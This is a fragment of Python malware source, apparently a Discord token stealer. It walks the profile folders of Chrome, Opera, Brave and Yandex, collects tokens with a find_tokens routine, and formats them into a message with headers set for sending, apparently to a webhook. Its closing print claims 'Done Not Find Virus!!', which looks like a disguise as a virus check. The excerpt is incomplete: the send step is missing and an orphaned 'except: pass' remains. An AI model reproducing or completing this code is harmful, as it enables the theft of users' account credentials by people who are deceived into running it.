
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**{platform}**\n```\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'
        message += '```'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

        
    except:
        pass
if __name__ == '__main__':
    print(WEBHOOK_URL)
    input()
    main()
    sleep(5)
    print("Done Not Find Virus!!")
    
